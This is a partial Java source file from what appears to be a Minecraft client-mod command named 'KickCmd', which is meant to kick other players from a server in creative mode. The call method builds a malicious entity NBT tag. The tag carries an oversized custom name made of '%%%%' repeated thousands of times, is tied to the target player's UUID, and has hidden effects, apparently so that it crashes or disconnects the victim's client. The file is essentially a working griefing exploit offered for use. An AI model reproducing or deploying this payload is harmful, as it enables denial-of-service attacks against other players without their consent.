...
public class KickCmd extends Command {
    ...
    public KickCmd() {
        super("kick", "kicks people from the server in creative");
    }
    ...
    public void call(String[] args) {
        ...
        String percent = "%%%%";
        long1.append(percent.repeat(7841));
        if (args.length < 1) {
            ChatUtils.message("Incorrect Arguments, use >kick <player>");
            return;
        }
        ...
        NbtCompound tag = CreativeUtils.parse("{EntityTag:{CustomNameVisible:0b,ActiveEffects:[{Id:7b,Amplifier:10b,Duration:200,ShowParticles:0b},{Id:14b,Amplifier:10b,Duration:200,ShowParticles:0b}],Health:1f,Owner:[I;" + ub[0] + "," + ub[1] + "," + ub[2] + "," + ub[3] + "],Sitting:1b,CustomName:'{\"text\":\"" + long1 + "\"}'}}");
        ...
        ChatUtils.message("Kicked player " + player);
    }
}
